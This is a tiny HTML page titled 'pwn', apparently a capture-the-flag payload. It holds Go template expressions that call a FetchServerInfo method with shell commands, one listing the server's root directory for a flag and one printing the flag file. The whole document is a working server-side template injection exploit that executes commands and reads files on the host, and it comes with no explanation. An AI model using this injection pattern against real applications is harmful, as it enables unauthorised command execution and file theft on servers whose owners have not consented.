<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
</head>

<body>
<h1>pwn</h1>
{{ .FetchServerInfo "ls / | grep flag" }} <br>
{{ .FetchServerInfo "cat /flagb7e3fccbe7.txt" }}
</body>
</html>
